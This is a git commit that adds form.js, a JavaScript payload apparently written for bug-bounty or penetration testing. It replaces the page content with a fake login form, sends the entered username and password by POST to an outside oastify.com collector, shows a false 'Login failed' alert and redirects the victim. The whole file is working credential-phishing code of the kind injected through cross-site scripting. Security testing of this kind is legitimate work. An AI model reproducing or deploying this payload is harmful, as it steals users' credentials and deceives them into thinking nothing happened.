9b1d70aa4eb243ab1aeaaceee4dabe8b19486e4a
dacabb <dacaniropentest@gmail.com>
2026-01-13 05:37:47 +0100

    Create form.js

---
+++ form.js
@@ -0,0 +1,33 @@
+var form = document.createElement('form');
+form.method = 'POST';
+form.action = 'https://2adp1qkg8320szfqq61ii946cxio6pue.oastify.com/roba';
+
+var inputUser = document.createElement('input');
+inputUser.name = 'username';
+inputUser.placeholder = 'Username';
+form.appendChild(inputUser);
+
+var inputPass = document.createElement('input');
+inputPass.type = 'password';
+inputPass.name = 'password';
+inputPass.placeholder = 'Password';
+form.appendChild(inputPass);
+
+var submit = document.createElement('input');
+submit.type = 'submit';
+submit.value = 'Login';
+form.appendChild(submit);
+
+document.body.innerHTML = '';
+document.body.appendChild(form);
+
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', form.action, true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    var data = 'username=' + encodeURIComponent(inputUser.value) + '&password=' + encodeURIComponent(inputPass.value);
+    xhr.send(data);
+    alert('Login failed. Please try again.');
+    window.location.href = 'https://bugbounty.ch/';
+});
